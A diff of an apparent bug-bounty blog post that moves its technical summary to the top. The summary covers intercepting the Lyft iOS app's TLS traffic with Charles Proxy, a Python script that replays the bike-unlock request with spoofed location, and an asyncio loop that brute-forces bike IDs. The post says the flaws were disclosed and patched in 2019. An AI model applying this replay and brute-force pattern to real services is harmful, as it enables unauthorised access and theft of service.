@@ -11,7 +11,130 @@ One cold San Francisco summer morning in Haight-Ashbury, my commute down to Mark
 
 I learned a ton, so I'm sharing the journey in case you may too.
 
-[Skip to technical summary →](#technical-summary)
+<details id="technical-summary" class="details-block">
+<summary>&nbsp;&nbsp;Technical summary (spoilers!)</summary>
+
+Goal: Remotely unlock a Lyft bike.
+
+Steps:
+1. [Capturing iOS App Encrypted Traffic](#capturing-ios-app-encrypted-traffic) – to re-construct request
+1. [Replaying Modified Unlock Request](#replaying-modified-unlock-request) – to bypass geofence
+1. [Brute-forcing Bike ID](#brute-forcing-bike-id) – since not available remotely
+
+## Capturing iOS App Encrypted Traffic
+
+I used Charles Proxy to capture outgoing requests from the Lyft app on my iPhone.
+
+<picture>
+  <source srcset="/images/blog/lyft-bikes/charles-proxy-routing-white.png" media="(prefers-color-scheme: dark)">
+  <img src="/images/blog/lyft-bikes/charles-proxy-routing-black.png" alt="Normal SSL handshake" class="img-inset">
+</picture>
+
+Charles supports `SSL Proxying`, which injects its own ephemeral certificates during SSL handshake, making sure requests from both sides are being signed with keys it controls.
+<picture>
+  <source srcset="/images/blog/lyft-bikes/normal-handshake-white.png" media="(prefers-color-scheme: dark)">
+  <img src="/images/blog/lyft-bikes/normal-handshake-black.png" alt="Reading decrypted traffic in Charles" class="img-inset">
+</picture>
+
+<picture>
+  <source srcset="/images/blog/lyft-bikes/intercepted-handshake-white.png" media="(prefers-color-scheme: dark)">
+  <img src="/images/blog/lyft-bikes/intercepted-handshake-black.png" alt="Intercepted SSL handshake via Charles" class="img-inset">
+</picture>
+
+This allows us to decrypt, read, and re-encrypt traffic in transit.
+
+<picture>
+  <source srcset="/images/blog/lyft-bikes/reading-encrypted-traffic-white.png" media="(prefers-color-scheme: dark)">
+  <img src="/images/blog/lyft-bikes/reading-encrypted-traffic-black.png" alt="Reading decrypted traffic in Charles" class="img-inset">
+</picture>
+
+The ephemeral certificates are signed by a Charles Certificate Authority, which needs to be installed on your phone so Charles's certificates are not rejected. SSL traffic content is then viewable.
+
+
+![api-routes.png](/images/blog/lyft-bikes/api-routes.png)
+
+## Replaying Modified Unlock Request
+
+From the Charles captures, we see the unlock request uses a `rent` endpoint with the following structure:
+
+```json
+POST "https://layer.bicyclesharing.net/mobile/v2/fgb/rent"
+
+HEADERS
+{
+  "api-key": "sk-XXXXX",
+  "authorization": "bearer-XXXXX",
+  ...
+}
+
+DATA
+{
+  "userLocation": { "lat": 37.7714859, "lon": -122.4449036 },
+  "qrCode": { "memberId": "user-XXXXX", "qrCode": "12345" },
+  ...
+}
+```
+
+A simple python replay script:
+
+```python
+import requests
+
+url="https://layer.bicyclesharing.net/mobile/v2/fgb/rent"
+
+headers={
+  "api-key": "sk-XXXXX",
+  "authorization": "bearer-XXXXX",
+}
+
+station_coords = { "lat": 37.7730627, "lon": -122.4390777 }    # from maps
+bike_id = "12345"                                              # dummy id
+
+data={
+  "userLocation": station_coords,
+  "qrCode": { "memberId": "user-XXXXX", "qrCode":  bike_id},
+}
+
+requests.post(url, headers=headers, json=data)
+```
+
+## Brute-forcing Bike ID
+
+Bike IDs are only accessible through the physical bikes (not counting eBikes, which were out of scope), to unlock one remotely, we need to brute force it. Five-digit IDs, but in practice only the `10000` to `20000` range is used, so 10,000 IDs to try.
+
+A naive implementation takes ~3 hours:
+```python
+def payload(i):
+    return {
+        "userLocation": station_coords,
+        "qrCode": { "memberId": "mem123", "qrCode":  i},
+    }
+
+def send_one(i):
+    requests.post(url, headers=headers, json=payload(i))
+
+for i in range(10_000, 20_000):
+    send_one(i)
+```
+But we can use `asyncio` and `aiohttp` to reduce that to ~15 seconds:
+
+```python
+import asyncio, aiohttp
+
+async def send_one(session, i):                              # non-blocking
+  async with session.post(url, headers=headers, json=payload(i)): pass
+
+async def main():
+  async with aiohttp.ClientSession() as s:
+    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
+    await asyncio.gather(*tasks)                             # wait for all
+
+asyncio.run(main())
+```
+
+Et voilà.
+
+</details>
 
 > **Disclaimer:** This writeup is meant for educational purposes only. Vulnerabilities discussed were disclosed to Lyft and patched in 2019.
 > 
@@ -318,131 +441,6 @@ And now we wait. Except by sheer coincidence[^6], my summer roommate was _also_ 
 In the end, I got a nice little $250 bounty, with an additional $250 bonus for a "good report". I then did the only thing I could imagine doing with $500 as a student and threw a well-stocked little house party...
 
 ...and, naturally, invited all the Lyft interns.
-
-<details id="technical-summary" class="details-block">
-<summary>Technical summary</summary>
-
-Goal: Remotely unlock a Lyft bike.
-
-Steps:
-1. [Capturing iOS App Encrypted Traffic](#capturing-ios-app-encrypted-traffic) – to re-construct request
-1. [Replaying Modified Unlock Request](#replaying-modified-unlock-request) – to bypass geofence
-1. [Brute-forcing Bike ID](#brute-forcing-bike-id) – since not available remotely
-
-## Capturing iOS App Encrypted Traffic
-
-I used Charles Proxy to capture outgoing requests from the Lyft app on my iPhone.
-
-<picture>
-  <source srcset="/images/blog/lyft-bikes/charles-proxy-routing-white.png" media="(prefers-color-scheme: dark)">
-  <img src="/images/blog/lyft-bikes/charles-proxy-routing-black.png" alt="Normal SSL handshake" class="img-inset">
-</picture>
-
-Charles supports `SSL Proxying`, which injects its own ephemeral certificates during SSL handshake, making sure requests from both sides are being signed with keys it controls.
-<picture>
-  <source srcset="/images/blog/lyft-bikes/normal-handshake-white.png" media="(prefers-color-scheme: dark)">
-  <img src="/images/blog/lyft-bikes/normal-handshake-black.png" alt="Reading decrypted traffic in Charles" class="img-inset">
-</picture>
-
-<picture>
-  <source srcset="/images/blog/lyft-bikes/intercepted-handshake-white.png" media="(prefers-color-scheme: dark)">
-  <img src="/images/blog/lyft-bikes/intercepted-handshake-black.png" alt="Intercepted SSL handshake via Charles" class="img-inset">
-</picture>
-
-This allows us to decrypt, read, and re-encrypt traffic in transit.
-
-<picture>
-  <source srcset="/images/blog/lyft-bikes/reading-encrypted-traffic-white.png" media="(prefers-color-scheme: dark)">
-  <img src="/images/blog/lyft-bikes/reading-encrypted-traffic-black.png" alt="Reading decrypted traffic in Charles" class="img-inset">
-</picture>
-
-The ephemeral certificates are signed by a Charles Certificate Authority, which needs to be installed on your phone so Charles's certificates are not rejected. SSL traffic content is then viewable.
-
-
-![api-routes.png](/images/blog/lyft-bikes/api-routes.png)
-
-## Replaying Modified Unlock Request
-
-From the Charles captures, we see the unlock request uses a `rent` endpoint with the following structure:
-
-```json
-POST "https://layer.bicyclesharing.net/mobile/v2/fgb/rent"
-
-HEADERS
-{
-  "api-key": "sk-XXXXX",
-  "authorization": "bearer-XXXXX",
-  ...
-}
-
-DATA
-{
-  "userLocation": { "lat": 37.7714859, "lon": -122.4449036 },
-  "qrCode": { "memberId": "user-XXXXX", "qrCode": "12345" },
-  ...
-}
-```
-
-A simple python replay script:
-
-```python
-import requests
-
-url="https://layer.bicyclesharing.net/mobile/v2/fgb/rent"
-
-headers={
-  "api-key": "sk-XXXXX",
-  "authorization": "bearer-XXXXX",
-}
-
-station_coords = { "lat": 37.7730627, "lon": -122.4390777 }    # from maps
-bike_id = "12345"                                              # dummy id
-
-data={
-  "userLocation": station_coords,
-  "qrCode": { "memberId": "user-XXXXX", "qrCode":  bike_id},
-}
-
-requests.post(url, headers=headers, json=data)
-```
-
-## Brute-forcing Bike ID
-
-Bike IDs are only accessible through the physical bikes (not counting eBikes, which were out of scope), to unlock one remotely, we need to brute force it. Five-digit IDs, but in practice only the `10000` to `20000` range is used, so 10,000 IDs to try.
-
-A naive implementation takes ~3 hours:
-```python
-def payload(i):
-    return {
-        "userLocation": station_coords,
-        "qrCode": { "memberId": "mem123", "qrCode":  i},
-    }
-
-def send_one(i):
-    requests.post(url, headers=headers, json=payload(i))
-
-for i in range(10_000, 20_000):
-    send_one(i)
-```
-But we can use `asyncio` and `aiohttp` to reduce that to ~15 seconds:
-
-```python
-import asyncio, aiohttp
-
-async def send_one(session, i):                              # non-blocking
-  async with session.post(url, headers=headers, json=payload(i)): pass
-
-async def main():
-  async with aiohttp.ClientSession() as s:
-    tasks = [send_one(s, i) for i in range(10_000, 20_000)]  # start all
-    await asyncio.gather(*tasks)                             # wait for all
-
-asyncio.run(main())
-```
-
-Et voilà.
-
-</details>
 
 
 [^1]: Simplification.
